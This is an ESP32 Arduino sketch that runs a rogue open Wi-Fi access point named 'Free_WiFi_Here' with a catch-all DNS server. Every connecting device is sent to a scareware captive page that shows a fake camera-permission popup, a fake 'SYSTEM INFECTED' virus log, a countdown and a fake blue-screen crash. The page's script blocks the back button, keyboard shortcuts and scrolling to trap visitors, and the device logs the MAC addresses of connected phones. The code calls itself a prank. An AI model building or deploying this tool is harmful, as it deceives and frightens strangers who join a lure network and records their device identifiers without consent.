#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ESPAsyncDNSServer.h>
#include "esp_wifi.h"

const char* ssid = "Free_WiFi_Here";

AsyncWebServer server(80);
AsyncDNSServer dns;

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Start WiFi AP
  WiFi.softAP(ssid);
  IPAddress AP_IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(AP_IP);

  // Start DNS server to redirect all queries to AP IP
  dns.start(53, "*", AP_IP);

  // Setup web server root page
// (same ESP32 setup as before with AP and DNS server)

server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
  const char* html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>System Infected</title>
<style>
  @keyframes flicker {
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
    20%, 22%, 24%, 55% { opacity: 0.6; }
  }
  html, body {
    margin: 0; padding: 10px;
    background: black;
    color: #0f0;
    font-family: "Courier New", Courier, monospace;
    height: 100%;
    overflow: hidden;
    user-select: none;
    -webkit-user-select: none;
    -webkit-touch-callout: none;
    touch-action: none;
    animation: flicker 3s infinite;
  }
  .ascii-art {
    font-size: 10px;
    line-height: 10px;
    white-space: pre;
    text-align: center;
    margin-bottom: 10px;
  }
  .blink {
    animation: blink 1s step-start 0s infinite;
    font-size: 2em;
    text-align: center;
    margin-bottom: 10px;
  }
  @keyframes blink {
    50% {opacity: 0;}
  }
  .progress-container {
    background-color: #004400;
    border: 1px solid #00ff00;
    width: 90vw;
    max-width: 500px;
    margin: 10px auto;
    height: 18px;
    border-radius: 5px;
  }
  .progress-bar {
    background-color: #00ff00;
    height: 100%;
    width: 0%;
    border-radius: 5px;
    transition: width 0.1s;
  }
  .code-scroll {
    height: 50vh;
    max-height: 400px;
    width: 90vw;
    max-width: 600px;
    margin: 15px auto;
    padding: 10px;
    background: black;
    border: 1px solid #00ff00;
    overflow-y: scroll;
    font-size: 14px;
    line-height: 16px;
    white-space: pre-wrap;
  }
  .code-line {
    white-space: nowrap;
  }
  /* Hide scrollbars on mobile */
  .code-scroll::-webkit-scrollbar {
    width: 0;
    background: transparent;
  }
  /* Error popup */
  #errorPopup {
    position: fixed;
    top: 20%;
    left: 50%;
    transform: translateX(-50%);
    background: #002200;
    border: 2px solid #00ff00;
    padding: 15px;
    font-family: monospace;
    color: #0f0;
    font-size: 1.2em;
    display: none;
    z-index: 10000;
    user-select: none;
  }
  /* Countdown timer */
  #countdown {
    position: fixed;
    bottom: 20px;
    right: 20px;
    font-family: monospace;
    font-size: 1.5em;
    color: #0f0;
    user-select: none;
  }
  /* BSOD Styles */
  #bsodScreen {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: #0000AA;
    color: white;
    font-family: "Courier New", monospace;
    text-align: center;
    padding-top: 20vh;
    font-size: 1.8em;
    user-select: none;
    z-index: 99999;
    animation: flicker 1.5s infinite;
  }
  /* BSOD subtle scanline effect */
  #bsodScreen::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    background: repeating-linear-gradient(
      0deg,
      rgba(255,255,255,0.03),
      rgba(255,255,255,0.03) 1px,
      transparent 2px,
      transparent 4px
    );
    z-index: 100000;
  }
  /* Fake Permissions Popup */
  #fakePermissionsPopup {
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: #111;
    border: 3px solid #0f0;
    padding: 20px 30px;
    width: 90vw;
    max-width: 400px;
    color: #0f0;
    font-size: 1.2em;
    z-index: 100000;
    text-align: center;
    user-select: none;
  }
  #fakePermissionsPopup button {
    background: #0f0;
    border: none;
    color: black;
    font-weight: bold;
    padding: 10px 20px;
    margin: 10px 15px 0 15px;
    cursor: pointer;
    font-size: 1em;
    border-radius: 4px;
  }
  #fakePermissionsPopup button:hover {
    background: #0a0;
  }
  #blockerOverlay {
    position: fixed;
    top:0; left:0; right:0; bottom:0;
    background: rgba(0,0,0,0.7);
    z-index: 99999;
  }
</style>
</head>
<body>

<div class="ascii-art" aria-hidden="true">
<pre>
   _____                 _    _____           _       _             
  |  __ \               | |  / ____|         (_)     | |            
  | |__) |___  ___ _   _| |_| |     ___   ___ _  __ _| | ___   __ _ 
  |  _  // _ \/ __| | | | __| |    / _ \ / __| |/ _` | |/ _ \ / _` |
  | | \ \  __/ (__| |_| | |_| |___| (_) | (__| | (_| | | (_) | (_| |
  |_|  \_\___|\___|\__,_|\__|\_____\___/ \___|_|\__, |_|\___/ \__, |
                                                __/ |         __/ |
                                               |___/         |___/ 
</pre>
</div>

<div class="blink" aria-live="polite" aria-atomic="true">SYSTEM INFECTED</div>

<div class="progress-container" aria-hidden="true">
  <div id="progressBar" class="progress-bar"></div>
</div>

<p style="text-align:center;">Injecting virus... Please wait...</p>

<div class="code-scroll" id="codeScroll" tabindex="0" aria-live="off"></div>

<div id="errorPopup" role="alert" aria-live="assertive"></div>
<div id="countdown" aria-live="assertive"></div>

<div id="bsodScreen" role="alert" aria-live="assertive" aria-atomic="true">
  <pre>
*** STOP: 0x0000007B (0xFFFFF880009A97E8, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)

INACCESSIBLE_BOOT_DEVICE

If this is the first time you've seen this Stop error screen,
restart your computer. If this screen appears again, follow
these steps:

Check to make sure any new hardware or software is properly installed.
If this is a new installation, ask your hardware vendor for any Windows updates
you might need.

If problems continue, disable or remove any newly installed hardware
or software. Disable BIOS memory options such as caching or shadowing.
If you need to use Safe Mode to remove or disable components, restart
your computer, press F8 to select Advanced Startup Options, and then
select Safe Mode.

Technical information:

*** STOP: 0x0000007B (INACCESSIBLE_BOOT_DEVICE)
  </pre>
</div>

<audio id="bsodBeep" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>

<!-- Fake Permissions Popup and Blocker -->
<div id="blockerOverlay"></div>
<div id="fakePermissionsPopup">
  <p><strong>Allow Camera and Microphone Access</strong></p>
  <p>This website needs permission to access your Camera and Microphone for security reasons.</p>
  <button id="allowBtn">Allow</button>
  <button id="denyBtn">Deny</button>
</div>

<script>
  // Disable zoom & scroll, block back button, selection, context menu
  function lockScreen() {
    ['touchmove', 'gesturestart', 'gesturechange', 'gestureend', 'contextmenu', 'selectstart'].forEach(evt => {
      document.addEventListener(evt, e => e.preventDefault(), { passive: false });
    });

    // Block back button by pushing history states repeatedly
    history.pushState(null, document.title, location.href);
    window.addEventListener('popstate', () => {
      history.pushState(null, document.title, location.href);
    });

    // Lock scroll to top continuously
    window.scrollTo(0, 0);
    window.addEventListener('scroll', () => window.scrollTo(0, 0));

    // Prevent keyboard shortcuts (Ctrl+W, Ctrl+R, Ctrl+Shift+I, F5, etc)
    window.addEventListener('keydown', function(e) {
      const forbiddenKeys = ['w', 'r', 't', 'n', 'Tab', 'F5', 'F12', 'I'];
      if ((e.ctrlKey || e.metaKey) && forbiddenKeys.includes(e.key.toLowerCase())) {
        e.preventDefault();
      }
      if (e.key === 'F5' || e.key === 'F12') e.preventDefault();
    });
  }

  // Fullscreen + orientation lock
  async function requestFullScreenAndLockOrientation() {
    try {
      if (!document.fullscreenElement) {
        await document.documentElement.requestFullscreen();
      }
      if (screen.orientation && screen.orientation.lock) {
        await screen.orientation.lock('portrait');
      }
    } catch (err) {
      console.warn('Fullscreen or orientation lock failed:', err);
    }
  }

  // Fake webcam/mic permission popup logic
  function fakePermissions() {
    const popup = document.getElementById('fakePermissionsPopup');
    const overlay = document.getElementById('blockerOverlay');
    const allowBtn = document.getElementById('allowBtn');
    const denyBtn = document.getElementById('denyBtn');

    function closePopup() {
      popup.style.display = 'none';
      overlay.style.display = 'none';
    }

    allowBtn.onclick = () => {
      closePopup();
      // After allowing, trigger full screen and orientation lock
      requestFullScreenAndLockOrientation();
      startVirusSequence();
    };

    denyBtn.onclick = () => {
      // Fake "permission denied" message, then close popup after 3 seconds
      popup.innerHTML = "<p><strong>Permission Denied.</strong></p><p>You must allow access to continue.</p>";
      setTimeout(() => {
        closePopup();
        // Start anyway but with delay and warning
        startVirusSequence(true);
      }, 3000);
    };

    // Show popup and overlay on page load
    popup.style.display = 'block';
    overlay.style.display = 'block';
  }

  // Virus injection progress bar & code scrolling logic
  const codeScroll = document.getElementById('codeScroll');
  const progressBar = document.getElementById('progressBar');
  const errorPopup = document.getElementById('errorPopup');
  const countdown = document.getElementById('countdown');
  const bsodScreen = document.getElementById('bsodScreen');
  const bsodBeep = document.getElementById('bsodBeep');

  // Sample "virus code" lines - randomized to look believable
  const codeLines = [
    "Injecting payload to kernel.exe ...",
    "Bypassing antivirus...",
    "Disabling firewall...",
    "Overwriting boot sector...",
    "Escalating privileges...",
    "Decrypting secure files...",
    "Encrypting documents...",
    "Uploading data to remote server...",
    "Closing all active connections...",
    "Clearing logs...",
    "Modifying registry keys...",
    "Installing rootkit module...",
    "Hooking system calls...",
    "Disabling recovery options...",
    "Triggering kernel panic...",
    "Injecting ransomware...",
    "Self destruct timer initiated...",
    "Erasing backup drives...",
    "Deleting shadow copies...",
    "System takeover complete..."
  ];

  function getRandomCodeLine() {
    const idx = Math.floor(Math.random() * codeLines.length);
    return codeLines[idx];
  }

  function appendCodeLine(line) {
    const p = document.createElement('div');
    p.className = 'code-line';
    p.textContent = line;
    codeScroll.appendChild(p);
    // Keep scroll at bottom
    codeScroll.scrollTop = codeScroll.scrollHeight;
  }

  // Show error popup with text
  function showError(text) {
    errorPopup.textContent = text;
    errorPopup.style.display = 'block';
  }

  // Hide error popup
  function hideError() {
    errorPopup.style.display = 'none';
  }

  // Main sequence control
  let progress = 0;
  let intervalId;
  let bsodCountdown = 30; // seconds for countdown

  function startVirusSequence(permissionDenied = false) {
    // Reset states
    progress = 0;
    progressBar.style.width = '0%';
    codeScroll.innerHTML = '';
    hideError();
    countdown.textContent = '';

    // If permission denied, delay start & show warning line
    if (permissionDenied) {
      appendCodeLine("WARNING: Permissions denied - limited functionality.");
    }

    intervalId = setInterval(() => {
      // Increase progress by random 2-5%
      const inc = Math.floor(Math.random() * 4) + 2;
      progress += inc;
      if (progress > 100) progress = 100;
      progressBar.style.width = progress + '%';

      // Append random code lines
      for (let i = 0; i < 3; i++) {
        appendCodeLine(getRandomCodeLine());
      }

      // Random error injection after 50% progress
      if (progress > 50 && Math.random() < 0.15) {
        showError("ERROR: Access violation at 0x" + Math.floor(Math.random() * 0xFFFFFFF).toString(16).toUpperCase());
      } else {
        hideError();
      }

      if (progress >= 100) {
        clearInterval(intervalId);
        showError("FATAL ERROR: System corrupted. Preparing BSOD...");
        startCountdownToBSOD();
      }
    }, 1000);
  }

  // Countdown timer for BSOD appearance
  function startCountdownToBSOD() {
    bsodCountdown = 30;
    countdown.textContent = "System crash in: " + bsodCountdown + " seconds";

    const countdownInterval = setInterval(() => {
      bsodCountdown--;
      if (bsodCountdown <= 0) {
        clearInterval(countdownInterval);
        countdown.textContent = "";
        showBSOD();
      } else {
        countdown.textContent = "System crash in: " + bsodCountdown + " seconds";
        // Play beep every 5 seconds
        if (bsodCountdown % 5 === 0) {
          bsodBeep.play();
        }
      }
    }, 1000);
  }

  // Show BSOD screen and block everything
  function showBSOD() {
    document.body.style.overflow = 'hidden';
    bsodScreen.style.display = 'block';
  }

  // Initialize prank on page load
  window.onload = () => {
    lockScreen();
    fakePermissions();
  };
</script>

</body>
</html>
)rawliteral";

  request->send(200, "text/html", html);
});


  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });

  server.begin();
}

void loop() {
  static unsigned long lastLogTime = 0;

  if (millis() - lastLogTime > 5000) {
    wifi_sta_list_t stationList;
    esp_wifi_ap_get_sta_list(&stationList);

    Serial.println("Connected Devices:");
    for (int i = 0; i < stationList.num; i++) {
      wifi_sta_info_t station = stationList.sta[i];
      Serial.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    station.mac[0], station.mac[1], station.mac[2], station.mac[3], station.mac[4], station.mac[5]);
    }
    Serial.println("-----------------------------");
    lastLogTime = millis();
  }
}
